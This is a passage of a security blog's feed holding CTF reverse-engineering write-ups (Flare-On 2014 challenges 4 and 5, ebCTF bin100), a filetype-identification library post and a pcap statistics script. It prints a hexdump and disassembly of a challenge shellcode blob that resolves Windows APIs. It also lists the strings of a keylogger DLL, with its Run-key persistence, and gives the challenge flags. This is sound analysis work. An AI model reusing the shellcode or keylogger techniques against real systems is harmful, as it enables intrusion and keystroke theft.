00000010  4a a8 b9 76 24 98 78 73  71 7d 7f 75 76 20 d4 96  |J..v$.xsq}.uv ..|
00000020  91 ba 70 19 f9 b8 32 e2  7b 46 a8 9b 01 fe c6 c7  |..p...2.{F......|
00000030  c1 e3 24 7e 7c 43 80 e1  15 b1 b2 b3 66 4f b6 27  |..$~|C......fO.&#39;|
00000040  3c 9f 4e 7a 2d 41 bf bb  05 77 28 f5 93 92 90 99  |&amp;lt;.Nz-A...w(.....|
00000050  98 a9 47 0a eb 14 49 3d  4b 48 2f 37 8d b9 78 34  |..G...I=KH/7..x4|
00000060  b4 0b d2 d5 31 e0 72 35  10 d6 40 67 be 2b fd 4a  |....1.r5..@g.+.J|
...&amp;lt;snip&amp;gt;...
000002c0  75 da 8b 53 3c 03 d3 ff  72 34 8b 52 78 03 d3 8b  |u..S&amp;lt;...r4.Rx...|
000002d0  72 20 03 f3 33 c9 41 ad  03 c3 81 38 47 65 74 50  |r ..3.A....8GetP|
000002e0  75 f4 81 78 04 72 6f 63  41 75 eb 81 78 08 64 64  |u..x.rocAu..x.dd|
000002f0  72 65 75 e2 49 8b 72 24  03 f3 66 8b 0c 4e 8b 72  |reu.I.r$..f..N.r|
00000300  1c 03 f3 8b 14 8e 03 d3  52 33 ff 57 68 61 72 79  |........R3.Whary|
00000310  41 68 4c 69 62 72 68 4c  6f 61 64 54 53 ff d2 68  |AhLibrhLoadTS..h|
00000320  33 32 01 01 66 89 7c 24  02 68 75 73 65 72 54 ff  |32..f.|$.huserT.|
00000330  d0 68 6f 78 41 01 8b df  88 5c 24 03 68 61 67 65  |.hoxA....\$.hage|
00000340  42 68 4d 65 73 73 54 50  ff 54 24 2c 57 68 44 21  |BhMessTP.T$,WhD!|
00000350  21 21 68 4f 57 4e 45 8b  dc e8 00 00 00 00 8b 14  |!!hOWNE.........|
00000360  24 81 72 0b 16 a3 fb 32  68 79 ce be 32 81 72 17  |$.r....2hy..2.r.|
00000370  ae 45 cf 48 68 c1 2b e1  2b 81 72 23 10 36 9f d2  |.E.Hh.+.+.r#.6..|
00000380  68 71 44 fa ff 81 72 2f  f7 a9 a9 0c 68 84 e9 cf  |hqD...r/....h...|
00000390  60 81 72 3b be 93 a9 43  68 d2 a3 98 37 81 72 47  |`.r;...Ch...7.rG|
000003a0  82 8a 62 3b 68 ef a4 11  4b 81 72 53 d6 47 c0 cc  |..b;h...K.rS.G..|
000003b0  68 be 69 a4 ff 81 72 5f  a3 ca 54 31 68 d4 ab 65  |h.i...r_..T1h..e|
000003c0  52 8b cc 57 53 51 57 8b  f1 89 f7 83 c7 1e 39 fe  |R..WSQW.......9.|
000003d0  7d 0b 81 36 42 45 45 46  83 c6 04 eb f1 ff d0 68  |}..6BEEF.......h|
000003e0  65 73 73 01 8b df 88 5c  24 03 68 50 72 6f 63 68  |ess....\$.hProch|
000003f0  45 78 69 74 54 ff 74 24  40 ff 54 24 40 57 ff d0  |ExitT.t$@.T$@W..|
00000400
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried disassembling and analyzing it but got nowhere:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cat shellcode.binary | udcli
0000000000000000 f9               stc
0000000000000001 7249             jb 0x4c
0000000000000003 46               inc esi
0000000000000004 25150d7f3c       and eax, 0x3c7f0d15
0000000000000009 3d84e02ad6       cmp eax, 0xd62ae084
000000000000000e 39e1             cmp ecx, esp
0000000000000010 4a               dec edx
...&amp;lt;snip&amp;gt;...
00000000000003c3 57               push edi
00000000000003c4 53               push ebx
00000000000003c5 51               push ecx
00000000000003c6 57               push edi
00000000000003c7 8bf1             mov esi, ecx
00000000000003c9 89f7             mov edi, esi
00000000000003cb 83c71e           add edi, 0x1e
00000000000003ce 39fe             cmp esi, edi
00000000000003d0 7d0b             jge 0x3dd
00000000000003d2 813642454546     xor dword [esi], 0x46454542
00000000000003d8 83c604           add esi, 0x4
00000000000003db ebf1             jmp 0x3ce
00000000000003dd ffd0             call eax
00000000000003df 6865737301       push 0x1737365
00000000000003e4 8bdf             mov ebx, edi
00000000000003e6 885c2403         mov [esp+0x3], bl
00000000000003ea 6850726f63       push 0x636f7250
00000000000003ef 6845786974       push 0x74697845
00000000000003f4 54               push esp
00000000000003f5 ff742440         push dword [esp+0x40]
00000000000003f9 ff542440         call dword [esp+0x40]
00000000000003fd 57               push edi
00000000000003fe ffd0             call eax
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is where the &lt;a href=&#34;http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html&#34;&gt;writeup&lt;/a&gt; from &lt;a href=&#34;https://twitter.com/bbaskin&#34;&gt;@bbaskin&lt;/a&gt; proved useful once again! I installed the recommended &lt;a href=&#34;https://github.com/MarioVilas/shellcode_tools/blob/master/shellcode2exe.py&#34;&gt;shellcode2exe.py&lt;/a&gt; tool and converted the shellcode blob to an EXE file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ shellcode2exe.py shellcode.binary
Shellcode to executable converter
by Mario Vilas (mvilas at gmail dot com)

Reading raw shellcode from file shellcode.binary
Generating executable file
Writing file shellcode.exe
Done.
$
$ ls -l shellcode.*
-rw-rw-r-- 1 shiv shiv 1024 Feb 18 16:48 shellcode.binary
-rw-rw-r-- 1 shiv shiv 6656 Feb 18 17:03 shellcode.exe
-rw-rw-rw- 1 shiv shiv 3072 Feb 16 11:09 shellcode.unicode
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While analyzing this file using Ollydbg, the email is decoded and placed right in front :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c4-1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So, the flag for this challenge is: &lt;code&gt;wa1ch.d3m.spl01ts@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;Challenge #5&lt;/h3&gt;

&lt;p&gt;Alright, on to the final challenge for this post. This is a binary file and let&amp;#8217;s gather some information about it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file 5get_it
5get_it: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
$
$ strings 5get_it
!This program cannot be run in DOS mode.
YRich
.text
`.rdata
@.data
.reloc
...&amp;lt;snip&amp;gt;...
svchost.log
[SHIFT]
[RETURN]
[BACKSPACE]
[TAB]
[CTRL]
[DELETE]
[CAPS LOCK]
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
svchost
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
svchost
ConsoleWindowClass
GetModuleHandle returned %d
c:\windows\system32\svchost.dll
c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll
UTF-8
UTF-16LE
...&amp;lt;snip&amp;gt;...
&amp;gt;8&amp;gt;D&amp;gt;`&amp;gt;
?0?P?\?x?
080X0x0
90;4;8;&amp;lt;;@;D;H;L;P;T;`;d;h;l;p;t;x;|;
&amp;lt; &amp;lt;$&amp;lt;(&amp;lt;,&amp;lt;0&amp;lt;4&amp;lt;8&amp;lt;&amp;lt;&amp;lt;@&amp;lt;D&amp;lt;H&amp;lt;L&amp;lt;P&amp;lt;T&amp;lt;X&amp;lt;\&amp;lt;`&amp;lt;d&amp;lt;h&amp;lt;l&amp;lt;p&amp;lt;t&amp;lt;x&amp;lt;|&amp;lt;
&amp;lt; =0=@=P=`=
4 4$4(4,4044484@4
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a DLL that has interesting strings referring some keyboard and registry keys. Also referenced is a Windows API, &lt;code&gt;GetAsyncKeyState&lt;/code&gt; that is commonly used within keyloggers to know whether a key is pressed or not. I tried analyzing this file through IDA and it proved quite useful. Upon loading the file you will find that there are references to a large number of variables that check if a certain key is pressed or not. I traced through the cross-references of all these variable and eventually found the flag:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c5-1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;As can be seen from the screenshot above, all these variable check if certain keys are pressed in sequence. The keys to be pressed and the order they have to be pressed is the flag: &lt;code&gt;l0gging.ur.5tr0ke5@flare-on.com&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
      <item>
      <title>cigma: A Pure Python Filetype Identification Library</title>
      <link>http://7h3rAm.github.io/2015/cigma.html</link>
      <guid>http://7h3rAm.github.io/2015/cigma.html</guid>
      <pubDate>Sun, 22 Nov 2015 00:00:00 GMT</pubDate>
      <description>&lt;p&gt;&lt;a href=&#34;https://github.com/7h3rAm/cigma&#34;&gt;cigma&lt;/a&gt; is a Python library to identify filetypes. It provides &lt;a href=&#34;https://github.com/threatstack/libmagic&#34;&gt;libmagic&lt;/a&gt; like mimetype identification of a file or data buffer. This is similar to what the &lt;code&gt;file&lt;/code&gt; command on *nix systems will provide:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file cigma.py
cigma.py: Python script, ASCII text executable
$
$ file readme.md
readme.md: Python script, ASCII text executable, with very long lines
$
$ file /bin/ls
/bin/ls: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=9d2a434c4ff55aad2ddd19348c0ac75971606483, stripped
$
$ file /etc/passwd
/etc/passwd: ASCII text
$
$ file /dev/sda
/dev/sda: block special
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;cigma&lt;/code&gt; uses a custom JSON formatted signature file to stores filetype mappings. Let&amp;#8217;s try identifying a few files:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ python cigma.py /bin/ls
(&#39;/bin/ls&#39;,
 {&#39;id&#39;: 29,
  &#39;longname&#39;: &#39;Executable and Linkable Format (ELF)&#39;,
  &#39;mimetype&#39;: &#39;application/x-executable&#39;,
  &#39;patterns&#39;: [{&#39;offset&#39;: 0, &#39;regex&#39;: &#39;\\x7F\\x45\\x4C\\x46&#39;, &#39;size&#39;: 4}],
  &#39;shortname&#39;: &#39;ELF&#39;})
$
$ python cigma.py ~/toolbox/testfiles/binary/suspicious/35d249cdd501aeb5a5b39daeb4f275c41c73e91ef299a094d27edbfd0396715d.VXE
(&#39;/home/shiv/toolbox/testfiles/binary/suspicious/35d249cdd501aeb5a5b39daeb4f275c41c73e91ef299a094d27edbfd0396715d.VXE&#39;,
 {&#39;id&#39;: 31,
  &#39;longname&#39;: &#39;Windows Executable&#39;,
  &#39;mimetype&#39;: &#39;application/x-dosexec&#39;,
  &#39;patterns&#39;: [{&#39;offset&#39;: 0, &#39;regex&#39;: &#39;\\x4D\\x5A&#39;, &#39;size&#39;: 2}],
  &#39;shortname&#39;: &#39;EXE&#39;})
$
$ python cigma.py ~/toolbox/testfiles/pcaps/exploitkits/2015-04-03-Nuclear-EK-traffic.pcap
(&#39;/home/shiv/toolbox/testfiles/pcaps/exploitkits/2015-04-03-Nuclear-EK-traffic.pcap&#39;,
 {&#39;id&#39;: 5,
  &#39;longname&#39;: &#39;Packet Capture (winpcap)&#39;,
  &#39;mimetype&#39;: &#39;application/vnd.tcpdump.pcap&#39;,
  &#39;patterns&#39;: [{&#39;offset&#39;: 0, &#39;regex&#39;: &#39;\\xD4\\xC3\\xB2\\xA1&#39;, &#39;size&#39;: 4}],
  &#39;shortname&#39;: &#39;PCAP&#39;})
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If a match is found, &lt;code&gt;cigma&lt;/code&gt; returns a &lt;code&gt;(source, resultdict)&lt;/code&gt; tuple. Here is a snippet of few signatures from the current set:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;{
  &#34;meta&#34;: {
    &#34;rulescount&#34;: 72,
    &#34;version&#34;: 0.1
  },
  &#34;rules&#34;: [
    {
      &#34;id&#34;: 1,
      &#34;longname&#34;: &#34;PKZIP&#34;,
      &#34;mimetype&#34;: &#34;application/octet-stream&#34;,
      &#34;patterns&#34;: [
        {
          &#34;offset&#34;: 0,
          &#34;regex&#34;: &#34;\\x50\\x4B\\x05\\x06&#34;,
          &#34;size&#34;: 4
        }
      ],
      &#34;shortname&#34;: &#34;ZIP&#34;
    },
    {
      &#34;id&#34;: 5,
      &#34;longname&#34;: &#34;Packet Capture (winpcap)&#34;,
      &#34;mimetype&#34;: &#34;application/vnd.tcpdump.pcap&#34;,
      &#34;patterns&#34;: [
        {
          &#34;offset&#34;: 0,
          &#34;regex&#34;: &#34;\\xD4\\xC3\\xB2\\xA1&#34;,
          &#34;size&#34;: 4
        }
      ],
      &#34;shortname&#34;: &#34;PCAP&#34;
    },
    {
      &#34;id&#34;: 27,
      &#34;longname&#34;: &#34;Flash Video&#34;,
      &#34;mimetype&#34;: &#34;video/x-flv&#34;,
      &#34;patterns&#34;: [
        {
          &#34;offset&#34;: 0,
          &#34;regex&#34;: &#34;\\x46\\x4C\\x56&#34;,
          &#34;size&#34;: 3
        }
      ],
      &#34;shortname&#34;: &#34;FLV&#34;
    },
    {
      &#34;id&#34;: 29,
      &#34;longname&#34;: &#34;Executable and Linkable Format (ELF)&#34;,
      &#34;mimetype&#34;: &#34;application/x-executable&#34;,
      &#34;patterns&#34;: [
        {
          &#34;offset&#34;: 0,
          &#34;regex&#34;: &#34;\\x7F\\x45\\x4C\\x46&#34;,
          &#34;size&#34;: 4
        }
      ],
      &#34;shortname&#34;: &#34;ELF&#34;
    }
  ]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Adding a new signature is really easy. Just edit the included &lt;code&gt;magicbytes.json&lt;/code&gt; file and add a new node with an unique &lt;code&gt;id&lt;/code&gt;. Each node should have a &lt;code&gt;patterns&lt;/code&gt; list which should contain the &lt;code&gt;offset&lt;/code&gt;, &lt;code&gt;regex&lt;/code&gt; and &lt;code&gt;size&lt;/code&gt; keys with respective values.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;cigma&lt;/code&gt; as a library is really easy:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;from cigma import Cigma
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One this is done, you can identify a file buffer:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;with open(&#34;/home/shiv/toolbox/testfiles/binary/crafted_corkami/gui.exe&#34;) as fo:
  filedata = fo.read()

Cigma(data=filedata).cigma()
(&#39;databuffer&#39;,
 {&#39;longname&#39;: &#39;Windows Executable&#39;,
  &#39;mimetype&#39;: &#39;application/x-dosexec&#39;,
  &#39;patterns&#39;: [{&#39;offset&#39;: 0, &#39;regex&#39;: &#39;\\x4D\\x5A&#39;, &#39;size&#39;: 2}],
  &#39;shortname&#39;: &#39;EXE&#39;})
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or else you can also identify a file itself:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Cigma(filename=&#34;/home/shiv/toolbox/testfiles/binary/crafted_corkami/gui.exe&#34;).cigma()
(&#39;/home/shiv/toolbox/testfiles/binary/crafted_corkami/gui.exe&#39;,
 {&#39;longname&#39;: &#39;Windows Executable&#39;,
  &#39;mimetype&#39;: &#39;application/x-dosexec&#39;,
  &#39;patterns&#39;: [{&#39;offset&#39;: 0, &#39;regex&#39;: &#39;\\x4D\\x5A&#39;, &#39;size&#39;: 2}],
  &#39;shortname&#39;: &#39;EXE&#39;})
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The primary purpose of &lt;code&gt;cigma&lt;/code&gt; is to be able to identify mundane files at lightning speeds. It doesn&amp;#8217;t aim to provide exhaustive insight into each file by parsing and decoding it. Currently, there are 70+ signatures and identification for more filetypes will be available as the project grows.&lt;/p&gt;
</description>
    </item>
      <item>
      <title>capinfos.py: Pure Python Pcap Statistics Tool</title>
      <link>http://7h3rAm.github.io/2015/capinfos.html</link>
      <guid>http://7h3rAm.github.io/2015/capinfos.html</guid>
      <pubDate>Sun, 02 Aug 2015 00:00:00 GMT</pubDate>
      <description>&lt;pre&gt;&lt;code&gt;from pprint import pprint
import datetime
import struct
import sys

def capinfos(filename):
  # generates wireshark&#39;s capinfos like stats
  # limited features
  # needs additional testing
  file_handle = open(filename, &#39;rb&#39;)
  data = file_handle.read()
  pcapstats = dict()
  endianness = None
  datalink_types = {
    0: &#39;DLT_NULL&#39;,
    1: &#39;DLT_EN10MB&#39;,
    2: &#39;DLT_EN3MB&#39;,
    3: &#39;DLT_AX25&#39;,
    4: &#39;DLT_PRONET&#39;,
    5: &#39;DLT_CHAOS&#39;,
    6: &#39;DLT_IEEE802&#39;,
    7: &#39;DLT_ARCNET&#39;,
    8: &#39;DLT_SLIP&#39;,
    9: &#39;DLT_PPP&#39;,
    10: &#39;DLT_FDDI&#39;,
    18: &#39;DLT_PFSYNC&#39;,
    105: &#39;DLT_IEEE802_11&#39;,
    113: &#39;DLT_LINUX_SLL&#39;,
    117: &#39;DLT_PFLOG&#39;,
    127: &#39;DLT_IEEE802_11_RADIO&#39;
  }
  # extract pcap magic using host&#39;s native endianess
  (pcap_magic, ) = struct.unpack(&#39;=I&#39;, data[:4])
  # if the pcap is LE
  if pcap_magic == 0xa1b2c3d4:
    (pcap_magic, pcap_version_major, pcap_version_minor, pcap_thiszone, pcap_sigfigs, pcap_snaplen, pcap_network) = struct.unpack(&#39;&amp;lt;IHHIIII&#39;, data[:24])
    endianness = &#39;LITTLE&#39;
  # if the pcap is BE
  elif pcap_magic == 0xd4c3b2a1:
    (pcap_magic, pcap_version_major, pcap_version_minor, pcap_thiszone, pcap_sigfigs, pcap_snaplen, pcap_network) = struct.unpack(&#39;&amp;gt;IHHIIII&#39;, data[:24])
    endianness = &#39;BIG&#39;
  # for pcaps which are something else (0x4d3c2b1a)?
  else:
    return pcapstats
  starttime = None
  endtime = None
  s = 24
  e = s + 16
  packetscount = 0
  bytescount = 0
  while True:
    if endianness is &#39;LITTLE&#39;:
      (ts_sec, ts_usec, incl_len, orig_len) = struct.unpack(&#39;&amp;lt;IIII&#39;, data[s:e])
    elif endianness is &#39;BIG&#39;:
      (ts_sec, ts_usec, incl_len, orig_len) = struct.unpack(&#39;&amp;gt;IIII&#39;, data[s:e])
    packetscount += 1
    bytescount += incl_len
    if not starttime:
      starttime = datetime.datetime.fromtimestamp(ts_sec)
      bytescount += incl_len
    endtime = datetime.datetime.fromtimestamp(ts_sec)
    s = e + incl_len
    e = s + 16
    if e &amp;gt; len(data):
      break
  totsecs = int((endtime - starttime).total_seconds())
  if totsecs &amp;lt; 1:
    totsecs = 1
  pcapstats[&#39;totsecs&#39;] = totsecs
  pcapstats[&#39;pcapmagic&#39;] = &#39;0x%08X&#39; % pcap_magic
  pcapstats[&#39;version_major&#39;] = pcap_version_major
  pcapstats[&#39;version_minor&#39;] = pcap_version_minor
  pcapstats[&#39;snaplen&#39;] = pcap_snaplen
  pcapstats[&#39;pcapencapsulation&#39;] = datalink_types[pcap_network]
  pcapstats[&#39;packetscount&#39;] = packetscount
  pcapstats[&#39;bytescount&#39;] = bytescount
  pcapstats[&#39;capturestarttime&#39;] = starttime.strftime(&#39;%c&#39;).strip()
  pcapstats[&#39;captureendtime&#39;] = endtime.strftime(&#39;%c&#39;).strip()
  pcapstats[&#39;captureduration&#39;] = (endtime - starttime).total_seconds()
  byterate = (bytescount / totsecs) if totsecs &amp;gt; 0 else bytescount
  bitrate = ((bytescount * 8) / totsecs) if totsecs &amp;gt; 0 else (bytescount * 8)
  pcapstats[&#39;byterate&#39;] = byterate
  pcapstats[&#39;bitrate&#39;] = bitrate
  avgpacketsize = (bytescount / packetscount) if packetscount &amp;gt; 0 else bytescount
  avgpacketrate = (packetscount / totsecs) if totsecs &amp;gt; 0 else packetscount
  pcapstats[&#39;avgpacketsize&#39;] = avgpacketsize
  pcapstats[&#39;avgpacketrate&#39;] = avgpacketrate
  return dict(pcapstats)


if __name__ == &#34;__main__&#34;:
  if len(sys.argv) != 2:
    print &#34;USAGE: %s &amp;lt;filename&amp;gt;&#34; % (sys.argv[0])
    sys.exit(1)

  pprint(capinfos(sys.argv[1]))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;#8217;s try this script on a HTTP pcap:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ python capinfos.py /media/shiv/red_third/stoolbox/testfiles/pcaps/layer7/http_espn.pcap
{
 &#39;avgpacketrate&#39;: 478,
 &#39;avgpacketsize&#39;: 682,
 &#39;bitrate&#39;: 2609012,
 &#39;byterate&#39;: 326126,
 &#39;bytescount&#39;: 652253,
 &#39;captureduration&#39;: 2.0,
 &#39;captureendtime&#39;: &#39;Wed Apr  7 22:59:31 2010&#39;,
 &#39;capturestarttime&#39;: &#39;Wed Apr  7 22:59:29 2010&#39;,
 &#39;packetscount&#39;: 956,
 &#39;pcapencapsulation&#39;: &#39;DLT_EN10MB&#39;,
 &#39;pcapmagic&#39;: &#39;0xA1B2C3D4&#39;,
 &#39;snaplen&#39;: 65535,
 &#39;totsecs&#39;: 2,
 &#39;version_major&#39;: 2,
 &#39;version_minor&#39;: 4
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The script accepts a pcap file as input and natively parse its structure to calculate required values. As can be seen in the output file, it shows a quick summary of statistics which could be quite useful for scripting and automation or to have a quick overview of input file. You can get this script &lt;a href=&#34;https://gist.github.com/7h3rAm/225e36ad59729000e00e7814e9644622&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
      <item>
      <title>Eindbazen CTF Challenge: bin100</title>
      <link>http://7h3rAm.github.io/2015/ebctf-bin100.html</link>
      <guid>http://7h3rAm.github.io/2015/ebctf-bin100.html</guid>
      <pubDate>Wed, 27 May 2015 00:00:00 GMT</pubDate>
      <description>&lt;pre&gt;&lt;code&gt;$ file bin100
bin100: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=b07165d860e4c153770483d43e42a54f92f5ac93, not stripped
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, an ELF file. Let&amp;#8217;s issue a customary &lt;code&gt;strings&lt;/code&gt; command on the challenge file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ strings bin100
/lib/ld-linux.so.2
CyIk
libstdc++.so.6
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
pthread_cancel
_ZNKSs4sizeEv
_ZNKSs4findEPKcj
_ZNSsixEj
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
_ZSt4cout
_ZNSaIcED1Ev
_ZNSsC1Ev
_ZNSolsEi
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
_ZNSsC1EPKcRKSaIcE
_ZNSt8ios_base4InitC1Ev
_ZSt3cin
_ZNSsD1Ev
_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E
_ZNKSs6lengthEv
_ZNSt8ios_base4InitD1Ev
_ZNSsaSEPKc
_ZNSolsEPFRSoS_E
__gxx_personality_v0
_ZNSaIcEC1Ev
_ZSt7getlineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RSbIS4_S5_T1_E
libm.so.6
libgcc_s.so.1
_Unwind_Resume
libc.so.6
_IO_stdin_used
srand
time
__cxa_atexit
__libc_start_main
GCC_3.0
GLIBC_2.1.3
GLIBC_2.0
CXXABI_1.3
GLIBCXX_3.4
PTRh
QVhL
D$Xf
T$X1
D$lk
D$lA
l$lA
D$lk
T$l1
[^_]
 -------
|       |
|   O   |
|       |
 -------
 -------
|     O |
|       |
| O     |
 -------
 -------
|     O |
|   O   |
| O     |
 -------
 -------
| O   O |
|       |
| O   O |
 -------
 -------
| O   O |
|   O   |
| O   O |
 -------
 -------
| O   O |
| O   O |
| O   O |
 -------
 -------
| O   O |
| O O O |
| O   O |
 -------
[*] ebCTF 2013 - BIN100 - Dice Game
    To get the flag you will need to throw the correct numbers.
[*] You will first need to throw a three, press enter to throw a dice!
[*] You rolled a three! Good!
hZCnFH#i
\.&amp;amp;[?8i
fY0Q|9
?y^/%
[*] You rolled a
 That is not a three :/
[*] Game over!
[*] Next you will need to throw a one, press enter to throw a dice!
[*] You rolled a one! Very nice!
 That is not a one :/
[*] Next you will need to throw another three, press enter to throw a dice!
[*] You rolled a three! Awesome!
[*] Throw another three for me now, press enter to throw a dice!
[*] You rolled another three! Almost there now!
[*] The last character you need to roll is a seven....  (o_O)  Press enter to throw a dice!
[*] You rolled a seven, with a six sided dice! How awesome are you?!
 That is not a seven :/
ebCTF
[*] You rolled 3-1-3-3-7, what does that make you? ELEET! \o/
[*] Nice job, here is the flag:
[!] It seems you did something wrong :( No flag for you.
;*2$&#34;
zPLR
GCC: (Debian 4.7.2-5) 4.7.2
GCC: (Debian 4.4.7-3) 4.4.7
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.gcc_except_table
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.5730
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bin100.c
_ZStL8__ioinit
_Z41__static_initialization_and_destruction_0ii
_GLOBAL__sub_I_main
_ZZL18__gthread_active_pvE20__gthread_active_ptr
__FRAME_END__
__JCR_END__
_GLOBAL_OFFSET_TABLE_
__init_array_end
__init_array_start
_DYNAMIC
data_start
_ZSt3cin@@GLIBCXX_3.4
_ZNSsaSEPKc@@GLIBCXX_3.4
_ZNSsC1Ev@@GLIBCXX_3.4
srand@@GLIBC_2.0
_ZNSolsEi@@GLIBCXX_3.4
__cxa_atexit@@GLIBC_2.1.3
__libc_csu_fini
_start
_ZSt7getlineIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RSbIS4_S5_T1_E@@GLIBCXX_3.4
__gmon_start__
_Jv_RegisterClasses
_fp_hw
_ZNSsixEj@@GLIBCXX_3.4
_fini
_ZNKSs4sizeEv@@GLIBCXX_3.4
_ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4
__libc_start_main@@GLIBC_2.0
_ZNKSs6lengthEv@@GLIBCXX_3.4
_ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4
_ZNKSs4findEPKcj@@GLIBCXX_3.4
_ITM_deregisterTMCloneTable
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@@GLIBCXX_3.4
_IO_stdin_used
_ZNSsD1Ev@@GLIBCXX_3.4
_ITM_registerTMCloneTable
__data_start
__TMC_END__
_ZNSsC1EPKcRKSaIcE@@GLIBCXX_3.4
_ZSt4cout@@GLIBCXX_3.4
__dso_handle
__libc_csu_init
time@@GLIBC_2.0
__bss_start
_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKSbIS4_S5_T1_E@@GLIBCXX_3.4
_ZNSaIcED1Ev@@GLIBCXX_3.4
pthread_cancel
_end
_ZNSolsEPFRSoS_E@@GLIBCXX_3.4
rand@@GLIBC_2.0
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@@GLIBCXX_3.4
_edata
_ZNSaIcEC1Ev@@GLIBCXX_3.4
__gxx_personality_v0@@CXXABI_1.3
_Unwind_Resume@@GCC_3.0
__i686.get_pc_thunk.bx
main
_init
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Quite a few interesting strings here. The title makes sense now. This looks like a dice game that requires us to throw certain number sequences to win. Let&amp;#8217;s give it a test run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ./bin100

[*] ebCTF 2013 - BIN100 - Dice Game
    To get the flag you will need to throw the correct numbers.

[*] You will first need to throw a three, press enter to throw a dice!

 -------
|       |
|   O   |
|       |
 -------

[*] You rolled a 1 That is not a three :/
[*] Game over!
$
$ ./bin100

[*] ebCTF 2013 - BIN100 - Dice Game
    To get the flag you will need to throw the correct numbers.

[*] You will first need to throw a three, press enter to throw a dice!

 -------
|     O |
|   O   |
| O     |
 -------

[*] You rolled a three! Good!

[*] Next you will need to throw a one, press enter to throw a dice!

 -------
|     O |
|       |
| O     |
 -------

[*] You rolled a 2 That is not a one :/
[*] Game over!
$
$ ./bin100

[*] ebCTF 2013 - BIN100 - Dice Game
    To get the flag you will need to throw the correct numbers.

[*] You will first need to throw a three, press enter to throw a dice!

 -------
| O   O |
|   O   |
| O   O |
 -------

[*] You rolled a 5 That is not a three :/
[*] Game over!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, looks like the first two numbers are &lt;code&gt;3&lt;/code&gt; and &lt;code&gt;1&lt;/code&gt; respectively. We might need multiple invocations to know further numbers in the expected sequence. Let&amp;#8217;s debug the file using GDB:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ gdb -q ./bin100
Reading symbols from ./bin100...(no debugging symbols found)...done.
gdb-peda$ break *main
Breakpoint 1 at 0x8048c4c
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alright, now let&amp;#8217;s run the binary and when the breakpoint is hit, we can disassemble the &lt;code&gt;main&lt;/code&gt; function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb-peda$ r
Starting program: /media/shiv/red_third/stoolbox/challenges/ebctf/bin100/bin100
[----------------------------------registers-----------------------------------]
EAX: 0x1
EBX: 0xf7e5a000 --&amp;gt; 0x1a9da8
ECX: 0xa8769374
